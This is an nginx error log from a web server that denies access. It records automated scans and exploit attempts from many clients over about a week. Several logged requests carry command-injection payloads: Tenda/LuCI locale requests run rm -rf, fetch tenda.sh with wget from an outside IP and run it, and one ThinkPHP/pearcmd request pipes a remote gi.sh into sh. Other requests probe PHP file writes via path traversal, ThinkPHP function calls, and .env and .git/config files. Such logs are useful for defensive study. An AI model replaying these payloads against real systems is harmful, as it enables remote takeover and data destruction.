2024/04/22 05:43:40 [notice] 648300#0: signal process started
2024/04/22 05:43:40 [error] 648300#0: open() "/root/nginx-1.16.1/logs/nginx.pid" failed (2: No such file or directory)
2024/04/22 05:45:06 [notice] 649043#0: signal process started
2024/04/28 03:07:54 [error] 671052#0: *2422 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 167.94.145.98, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 03:19:38 [error] 671052#0: *2429 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 03:19:38 [error] 671052#0: *2429 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 03:37:32 [error] 671052#0: *2430 "/root/nginx-1.16.1/html/WebInterface/index.html" is forbidden (13: Permission denied), client: 161.35.181.26, server: , request: "GET /WebInterface/ HTTP/1.1", host: "20.2.240.132"
2024/04/28 04:00:10 [error] 671052#0: *2432 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 115.231.78.12, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 04:00:11 [error] 671052#0: *2435 open() "/root/nginx-1.16.1/html/robots.txt" failed (13: Permission denied), client: 115.231.78.12, server: , request: "GET /robots.txt HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 05:32:19 [error] 671052#0: *2446 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 05:32:19 [error] 671052#0: *2446 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 06:56:06 [error] 671052#0: *2448 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 198.235.24.156, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:23 [error] 671052#0: *2450 open() "/root/nginx-1.16.1/html/QaRX" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /QaRX HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:23 [error] 671052#0: *2451 open() "/root/nginx-1.16.1/html/hGIe" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /hGIe HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:24 [error] 671052#0: *2452 open() "/root/nginx-1.16.1/html/aab8" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /aab8 HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:24 [error] 671052#0: *2453 open() "/root/nginx-1.16.1/html/jquery-3.3.1.slim.min.js" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /jquery-3.3.1.slim.min.js HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:25 [error] 671052#0: *2454 open() "/root/nginx-1.16.1/html/aab9" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /aab9 HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:07:25 [error] 671052#0: *2455 open() "/root/nginx-1.16.1/html/jquery-3.3.2.slim.min.js" failed (13: Permission denied), client: 148.153.56.86, server: , request: "GET /jquery-3.3.2.slim.min.js HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 07:16:58 [error] 671052#0: *2456 open() "/root/nginx-1.16.1/html/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (13: Permission denied), client: 192.241.195.40, server: , request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1", host: "20.2.240.132"
2024/04/28 08:32:42 [error] 671052#0: *2470 "/root/nginx-1.16.1/html/WebInterface/index.html" is forbidden (13: Permission denied), client: 170.64.159.164, server: , request: "GET /WebInterface/ HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:13:49 [error] 671052#0: *2484 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:13:49 [error] 671052#0: *2484 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:29:32 [error] 671052#0: *2486 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 111.7.96.148, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 10:36:42 [error] 671052#0: *2487 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 184.105.247.194, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:41:04 [error] 671052#0: *2490 "/root/nginx-1.16.1/html/webui/index.html" is forbidden (13: Permission denied), client: 184.105.247.194, server: , request: "GET /webui/ HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:45:33 [error] 671052#0: *2501 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 184.105.247.194, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:49:27 [error] 671052#0: *2502 "/root/nginx-1.16.1/html/geoserver/web/index.html" is forbidden (13: Permission denied), client: 184.105.247.194, server: , request: "GET /geoserver/web/ HTTP/1.1", host: "20.2.240.132"
2024/04/28 10:51:00 [error] 671052#0: *2503 open() "/root/nginx-1.16.1/html/.git/config" failed (13: Permission denied), client: 184.105.247.194, server: , request: "GET /.git/config HTTP/1.1", host: "20.2.240.132"
2024/04/28 13:07:23 [error] 671052#0: *2506 open() "/root/nginx-1.16.1/html/hFkC" failed (13: Permission denied), client: 45.56.108.128, server: , request: "GET /hFkC HTTP/1.1", host: "20.2.240.132"
2024/04/28 13:32:17 [error] 671052#0: *2509 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 162.142.125.221, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 13:32:22 [error] 671052#0: *2510 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 162.142.125.221, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 14:33:55 [error] 671052#0: *2519 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 45.79.181.251, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 14:53:51 [error] 671052#0: *2530 open() "/root/nginx-1.16.1/html/owa/auth/logon.aspx" failed (13: Permission denied), client: 198.199.94.11, server: , request: "GET /owa/auth/logon.aspx HTTP/1.1", host: "20.2.240.132"
2024/04/28 15:12:10 [error] 671052#0: *2534 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 199.45.154.68, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 15:12:14 [error] 671052#0: *2535 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 199.45.154.68, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 16:30:37 [error] 671052#0: *2542 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 115.231.78.12, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 16:46:28 [error] 671052#0: *2555 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 111.7.96.169, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 17:18:30 [error] 671052#0: *2556 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 185.180.143.138, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/28 18:37:04 [error] 671052#0: *2558 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 83.97.73.245, server: , request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 18:47:19 [error] 671052#0: *2561 open() "/root/nginx-1.16.1/html/index.php" failed (13: Permission denied), client: 92.118.39.120, server: , request: "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/var/tmp/index1.php HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 18:47:19 [error] 671052#0: *2561 open() "/root/nginx-1.16.1/html/index.php" failed (13: Permission denied), client: 92.118.39.120, server: , request: "GET /index.php?lang=../../../../../../../../var/tmp/index1 HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 18:47:20 [error] 671052#0: *2561 open() "/root/nginx-1.16.1/html/index.php" failed (13: Permission denied), client: 92.118.39.120, server: , request: "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 18:47:21 [error] 671052#0: *2561 open() "/root/nginx-1.16.1/html/public/index.php" failed (13: Permission denied), client: 92.118.39.120, server: , request: "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 18:47:21 [error] 671052#0: *2561 open() "/root/nginx-1.16.1/html/index.php" failed (13: Permission denied), client: 92.118.39.120, server: , request: "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=curl%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20%7c%7c%20wget%20-O-%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20 HTTP/1.1", host: "20.2.240.132:443"
2024/04/28 19:03:44 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:44 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:45 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 8.210.123.17, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:46 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:47 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:47 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:47 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/28 19:03:47 [error] 671052#0: *2564 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 8.210.123.17, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/28 21:08:25 [error] 671052#0: *2570 open() "/root/nginx-1.16.1/html/actuator/gateway/routes" failed (13: Permission denied), client: 83.97.73.245, server: , request: "GET /actuator/gateway/routes HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 00:51:48 [error] 671052#0: *2582 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 184.105.139.70, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 00:56:58 [error] 671052#0: *2585 "/root/nginx-1.16.1/html/webui/index.html" is forbidden (13: Permission denied), client: 184.105.139.70, server: , request: "GET /webui/ HTTP/1.1", host: "20.2.240.132"
2024/04/29 01:01:25 [error] 671052#0: *2597 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 184.105.139.70, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 01:05:28 [error] 671052#0: *2598 "/root/nginx-1.16.1/html/geoserver/web/index.html" is forbidden (13: Permission denied), client: 184.105.139.70, server: , request: "GET /geoserver/web/ HTTP/1.1", host: "20.2.240.132"
2024/04/29 01:07:08 [error] 671052#0: *2599 open() "/root/nginx-1.16.1/html/.git/config" failed (13: Permission denied), client: 184.105.139.70, server: , request: "GET /.git/config HTTP/1.1", host: "20.2.240.132"
2024/04/29 01:19:56 [error] 671052#0: *2600 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 87.236.176.139, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 01:20:58 [error] 671052#0: *2604 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 4.242.26.59, server: , request: "GET / HTTP/1.0"
2024/04/29 01:25:22 [error] 671052#0: *2613 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 35.203.210.43, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 02:23:50 [error] 671052#0: *2624 open() "/root/nginx-1.16.1/html/version" failed (13: Permission denied), client: 192.241.216.31, server: , request: "GET /version HTTP/1.1", host: "20.2.240.132"
2024/04/29 02:32:37 [error] 671052#0: *2627 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 185.242.226.70, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 03:57:46 [error] 671052#0: *2633 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 205.210.31.26, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 04:23:13 [error] 671052#0: *2634 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 34.219.172.121, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 04:43:02 [error] 671052#0: *2635 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 45.115.225.247, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 04:46:10 [error] 671052#0: *2636 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 04:46:10 [error] 671052#0: *2636 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 05:29:00 [error] 671052#0: *2638 open() "/root/nginx-1.16.1/html/owa/auth/logon.aspx" failed (13: Permission denied), client: 162.243.132.16, server: , request: "GET /owa/auth/logon.aspx HTTP/1.1", host: "20.2.240.132"
2024/04/29 07:17:56 [error] 671052#0: *2645 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 35.187.98.121, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 07:35:39 [error] 671052#0: *2647 open() "/root/nginx-1.16.1/html/.env" failed (13: Permission denied), client: 78.153.140.179, server: , request: "GET /.env HTTP/1.1", host: "20.2.240.132"
2024/04/29 08:44:54 [error] 671052#0: *2663 open() "/root/nginx-1.16.1/html/.env" failed (13: Permission denied), client: 161.97.96.65, server: , request: "GET /.env HTTP/1.1", host: "20.2.240.132"
2024/04/29 08:44:56 [error] 671052#0: *2664 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 161.97.96.65, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:00:42 [error] 671052#0: *2669 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 80.82.70.217, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 10:23:25 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:25 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:25 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:27 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:27 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:28 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:28 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:29 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:29 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:29 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:29 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:30 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:30 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:30 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:31 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:32 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:32 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:32 [error] 671052#0: *2673 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.125.252, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:33 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:34 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:34 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:34 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:23:34 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
